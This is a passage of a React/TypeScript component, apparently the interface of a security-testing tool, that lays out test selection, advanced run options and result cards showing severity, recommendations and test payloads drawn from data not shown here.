                                                        type="checkbox"
                                                        checked={selectedTests.has(test.id)}
                                                        onChange={(e) => {
                                                            e.preventDefault();
                                                            e.stopPropagation();
                                                            toggleTest(test.id);
                                                        }}
                                                        onClick={(e) => {
                                                            e.stopPropagation();
                                                        }}
                                                        style={{
                                                            marginTop: "4px",
                                                            flexShrink: 0,
                                                            pointerEvents: "auto",
                                                            zIndex: 10,
                                                            position: "relative",
                                                            width: "clamp(20px, 2.5vw, 24px)",
                                                            height: "clamp(20px, 2.5vw, 24px)"
                                                        }}
                                                    />
                                                    <div className="test-content" style={{ flex: 1, minWidth: 0, wordWrap: "break-word", overflowWrap: "break-word" }}>
                                                        <div style={{ display: "flex", alignItems: "center", gap: "clamp(10px, 1.2vw, 12px)", marginBottom: "clamp(12px, 1.5vw, 16px)", flexWrap: "wrap" }}>
                                                            <h4 style={{ 
                                                                margin: 0, 
                                                                flex: 1,
                                                                fontSize: "clamp(16px, 1.8vw, 18px)",
                                                                fontWeight: "700",
                                                                color: "var(--text-primary)"
                                                            }}>{test.name}</h4>
                                                            <span style={{
                                                                padding: "clamp(4px, 0.5vh, 6px) clamp(10px, 1.2vw, 14px)",
                                                                borderRadius: "16px",
                                                                fontSize: "clamp(11px, 1.3vw, 12px)",
                                                                fontWeight: "700",
                                                                backgroundColor: test.severity === "high" ? "rgba(220, 53, 69, 0.25)" : test.severity === "medium" ? "rgba(255, 193, 7, 0.25)" : "rgba(40, 167, 69, 0.25)",
                                                                color: test.severity === "high" ? "#dc3545" : test.severity === "medium" ? "#ffc107" : "#28a745",
                                                                textTransform: "uppercase",
                                                                border: `2px solid ${test.severity === "high" ? "#dc3545" : test.severity === "medium" ? "#ffc107" : "#28a745"}`
                                                            }}>
                                                                {test.severity}
                                                            </span>
                                                            {test.cwe && (
                                                                <span style={{
                                                                    padding: "clamp(4px, 0.5vh, 6px) clamp(10px, 1.2vw, 14px)",
                                                                    borderRadius: "16px",
                                                                    fontSize: "clamp(11px, 1.3vw, 12px)",
                                                                    fontWeight: "600",
                                                                    backgroundColor: "var(--bg-tertiary)",
                                                                    color: "var(--text-secondary)",
                                                                    border: "1px solid var(--border-color)"
                                                                }}>
                                                                    {test.cwe}
                                                                </span>
                                                            )}
                                                        </div>
                                                        <div style={{
                                                            padding: "clamp(12px, 1.5vw, 16px)",
                                                            backgroundColor: "var(--bg-tertiary)",
                                                            borderRadius: "10px",
                                                            marginBottom: "clamp(12px, 1.5vw, 16px)",
                                                            border: "1px solid var(--border-color)"
                                                        }}>
                                                            <p style={{ 
                                                                margin: "0 0 clamp(10px, 1.2vh, 12px) 0", 
                                                                fontSize: "clamp(13px, 1.5vw, 15px)", 
                                                                color: "var(--text-primary)", 
                                                                lineHeight: "1.6",
                                                                fontWeight: "500"
                                                            }}>{test.description}</p>
                                                            <div style={{
                                                                marginTop: "clamp(10px, 1.2vh, 12px)",
                                                                paddingTop: "clamp(10px, 1.2vh, 12px)",
                                                                borderTop: "1px solid var(--border-color)"
                                                            }}>
                                                                <div style={{
                                                                    fontSize: "clamp(12px, 1.4vw, 14px)",
                                                                    color: "var(--text-secondary)",
                                                                    lineHeight: "1.7",
                                                                    fontWeight: "400"
                                                                }}>
                                                                    {test.detailedDescription}
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div style={{ display: "flex", flexWrap: "wrap", gap: "clamp(8px, 1vw, 12px)", alignItems: "center" }}>
                                                            {test.payloads.length > 0 && (
                                                                <div style={{
                                                                    padding: "clamp(6px, 0.8vh, 8px) clamp(10px, 1.2vw, 14px)",
                                                                    backgroundColor: "rgba(74, 158, 255, 0.15)",
                                                                    borderRadius: "8px",
                                                                    fontSize: "clamp(11px, 1.3vw, 12px)",
                                                                    color: "var(--accent-primary)",
                                                                    fontWeight: "600",
                                                                    display: "flex",
                                                                    alignItems: "center",
                                                                    gap: "6px",
                                                                    border: "1px solid rgba(74, 158, 255, 0.3)"
                                                                }}>
                                                                    <i className="fa fa-bug"></i>
                                                                    <span>{test.payloads.length} payload{test.payloads.length !== 1 ? "s" : ""}</span>
                                                                </div>
                                                            )}
                                                            {test.owasp && (
                                                                <div style={{
                                                                    padding: "clamp(6px, 0.8vh, 8px) clamp(10px, 1.2vw, 14px)",
                                                                    backgroundColor: "var(--bg-secondary)",
                                                                    borderRadius: "8px",
                                                                    fontSize: "clamp(11px, 1.3vw, 12px)",
                                                                    color: "var(--text-secondary)",
                                                                    fontWeight: "600",
                                                                    display: "flex",
                                                                    alignItems: "center",
                                                                    gap: "6px",
                                                                    border: "1px solid var(--border-color)"
                                                                }}>
                                                                    <i className="fa fa-shield"></i>
                                                                    <span>{test.owasp}</span>
                                                                </div>
                                                            )}
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                ))}
                            </div>
                        </div>

                        <div style={{ marginTop: "12px", width: "100%", flexShrink: 0 }}>
                        <button
                            className="btn-sleek glint-effect"
                            onClick={() => setShowAdvanced(!showAdvanced)}
                            style={{
                                padding: "12px 16px",
                                fontSize: "14px",
                                width: "100%",
                                borderRadius: "8px",
                                fontWeight: "600",
                                backgroundColor: "var(--bg-secondary)",
                                border: "2px solid var(--border-color)",
                                color: "var(--text-primary)",
                                transition: "all 0.2s ease"
                            }}
                            onMouseEnter={(e) => {
                                e.currentTarget.style.borderColor = "var(--accent-primary)";
                                e.currentTarget.style.backgroundColor = "var(--bg-tertiary)";
                            }}
                            onMouseLeave={(e) => {
                                e.currentTarget.style.borderColor = "var(--border-color)";
                                e.currentTarget.style.backgroundColor = "var(--bg-secondary)";
                            }}
                        >
                            <i className={`fa fa-${showAdvanced ? "chevron-up" : "chevron-down"}`} style={{ marginRight: "8px" }}></i> {showAdvanced ? "Hide" : "Show"} Advanced Options
                        </button>
                    </div>

                    {showAdvanced && (
                        <div className="test-controls">
                            <div>
                                <label className="label-sleek" style={{ display: "block", marginBottom: "8px", fontSize: "13px", fontWeight: "600" }}>Test Timeout (seconds):</label>
                                <input
                                    type="number"
                                    className="input-sleek"
                                    value={testTimeout}
                                    onChange={(e) => setTestTimeout(parseInt(e.target.value) || 30)}
                                    min={5}
                                    max={300}
                                    style={{ width: "100%", padding: "10px 12px", fontSize: "14px", borderRadius: "8px" }}
                                />
                            </div>

                            <div>
                                <label className="label-sleek" style={{ display: "block", marginBottom: "8px", fontSize: "13px", fontWeight: "600" }}>Concurrent Tests:</label>
                                <input
                                    type="number"
                                    className="input-sleek"
                                    value={concurrentTests}
                                    onChange={(e) => setConcurrentTests(parseInt(e.target.value) || 5)}
                                    min={1}
                                    max={20}
                                    style={{ width: "100%", padding: "10px 12px", fontSize: "14px", borderRadius: "8px" }}
                                />
                            </div>

                            <div>
                                <label className="label-sleek" style={{ display: "block", marginBottom: "8px", fontSize: "13px", fontWeight: "600" }}>Severity Filter:</label>
                                <select
                                    className="select-sleek"
                                    value={severityFilter}
                                    onChange={(e) => setSeverityFilter(e.target.value as any)}
                                    style={{ width: "100%", padding: "10px 12px", fontSize: "14px", borderRadius: "8px" }}
                                >
                                    <option value="all">All Severities</option>
                                    <option value="high">High Only</option>
                                    <option value="medium">Medium Only</option>
                                    <option value="low">Low Only</option>
                                </select>
                            </div>

                            <label style={{ display: "flex", alignItems: "center", gap: "10px", cursor: "pointer", padding: "8px 0" }}>
                                <input
                                    type="checkbox"
                                    checked={stopOnFirstVulnerability}
                                    onChange={(e) => setStopOnFirstVulnerability(e.target.checked)}
                                    style={{ width: "18px", height: "18px", cursor: "pointer", accentColor: "var(--accent-primary)" }}
                                />
                                <span style={{ fontSize: "14px", color: "var(--text-primary)" }}>Stop on First Vulnerability</span>
                            </label>
                        </div>
                    )}

                    <button
                        className="btn-sleek btn-sleek-success glint-effect"
                        onClick={runSecurityTests}
                        disabled={running || (testMode === "single" && !selectedFlow) || selectedTests.size === 0}
                        style={{ 
                            width: "100%", 
                            padding: "14px 20px", 
                            fontSize: "15px", 
                            fontWeight: "600", 
                            marginTop: "12px",
                            borderRadius: "10px",
                            transition: "all 0.3s ease",
                            backgroundColor: "var(--accent-primary)",
                            border: "2px solid var(--accent-primary)",
                            color: "white",
                            boxShadow: "0 2px 8px rgba(74, 158, 255, 0.3)"
                        }}
                        onMouseEnter={(e) => {
                            if (!e.currentTarget.disabled) {
                                e.currentTarget.style.transform = "scale(1.02)";
                                e.currentTarget.style.boxShadow = "0 4px 12px rgba(74, 158, 255, 0.4)";
                            }
                        }}
                        onMouseLeave={(e) => {
                            e.currentTarget.style.transform = "scale(1)";
                            e.currentTarget.style.boxShadow = "0 2px 8px rgba(74, 158, 255, 0.3)";
                        }}
                    >
                        <i className={`fa fa-${running ? "spinner fa-spin" : "play"}`} style={{ marginRight: "8px" }}></i> {running ? "Running Tests..." : "Run Security Tests"}
                    </button>
                    </div>
                </div>

                <div style={{
                    display: "flex",
                    flexDirection: "column",
                    gap: "16px",
                    overflowY: "auto",
                    paddingRight: "8px",
                    minHeight: 0,
                    minWidth: 0
                }}>
                    {testResults.length > 0 ? (
                        testResults.map((result, index) => {
                            const test = securityTests.find(t => t.id === result.test_id);
                            const severityColors = {
                                high: "var(--accent-danger)",
                                medium: "var(--accent-warning)",
                                low: "var(--accent-primary)",
                            };
                            return (
                                <div
                                    key={index}
                                    className="card-sleek glint-effect"
                                    style={{
                                        padding: "24px",
                                        boxShadow: "var(--shadow-md)",
                                        border: result.vulnerable ? `2px solid ${severityColors[result.severity as keyof typeof severityColors] || "var(--accent-danger)"}` : "2px solid var(--border-color)",
                                        backgroundColor: result.vulnerable ? `rgba(${result.severity === "high" ? "220, 53, 69" : result.severity === "medium" ? "255, 193, 7" : "0, 123, 255"}, 0.05)` : "var(--bg-primary)",
                                        borderRadius: "16px",
                                        minWidth: 0
                                    }}
                                >
                                    <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", marginBottom: "16px" }}>
                                        <div style={{ flex: 1 }}>
                                            <div style={{ display: "flex", alignItems: "center", gap: "12px", marginBottom: "8px" }}>
                                                <h3 style={{ fontSize: "18px", fontWeight: "600", margin: 0 }}>{test?.name || result.test_name}</h3>
                                                <span
                                                    style={{
                                                        padding: "6px 12px",
                                                        borderRadius: "12px",
                                                        backgroundColor: result.vulnerable ? severityColors[result.severity as keyof typeof severityColors] || "var(--accent-danger)" : "var(--accent-secondary)",
                                                        color: "white",
                                                        fontSize: "11px",
                                                        fontWeight: "700",
                                                        textTransform: "uppercase",
                                                    }}
                                                >
                                                    {result.vulnerable ? `VULNERABLE - ${result.severity?.toUpperCase() || "HIGH"}` : "SAFE"}
                                                </span>
                                            </div>
                                            <p style={{ fontSize: "13px", color: "var(--text-secondary)", margin: 0 }}>
                                                {result.description || test?.description || "Test completed"}
                                            </p>
                                        </div>
                                    </div>

                                    {result.vulnerable && result.recommendations && result.recommendations.length > 0 && (
                                        <div style={{ marginTop: "16px", padding: "12px", backgroundColor: "var(--bg-secondary)", borderRadius: "8px", border: "1px solid var(--border-color)" }}>
                                            <div style={{ fontSize: "13px", fontWeight: "600", marginBottom: "8px", color: "var(--accent-warning)" }}>
                                                <i className="fa fa-lightbulb-o"></i> Recommendations:
                                            </div>
                                            <ul style={{ margin: 0, paddingLeft: "20px", fontSize: "12px", color: "var(--text-primary)" }}>
                                                {result.recommendations.map((rec: string, i: number) => (
                                                    <li key={i} style={{ marginBottom: "4px" }}>{rec}</li>
                                                ))}
                                            </ul>
                                        </div>
                                    )}

                                    {test?.payloads && test.payloads.length > 0 && result.vulnerable && (
                                        <div style={{ marginTop: "16px", padding: "14px", backgroundColor: "var(--bg-secondary)", borderRadius: "10px", border: "1px solid var(--border-color)" }}>
                                            <div style={{ fontSize: "14px", fontWeight: "600", marginBottom: "10px" }}>Test Payloads:</div>
                                            <div style={{ display: "flex", flexDirection: "column", gap: "8px" }}>
                                                {test.payloads.map((payload, i) => (
                                                    <code key={i} style={{ padding: "8px 12px", backgroundColor: "var(--bg-tertiary)", borderRadius: "6px", fontSize: "12px", fontFamily: "monospace", wordBreak: "break-all", lineHeight: "1.5" }}>
                                                        {payload}
                                                    </code>
                                                ))}
                                            </div>
                                        </div>
                                    )}
                                </div>
                            );
                        })
                    ) : (
                        <div className="card-sleek" style={{ padding: "60px", textAlign: "center", color: "var(--text-secondary)" }}>
                            <i className="fa fa-shield" style={{ fontSize: "64px", opacity: 0.3, marginBottom: "16px" }}></i>
                            <p style={{ fontSize: "16px", fontWeight: "500" }}>Select tests and click "Run Security Tests" to begin</p>
                        </div>
                    )}
                </div>
            </div>
            </div>
        </div>
    );
}
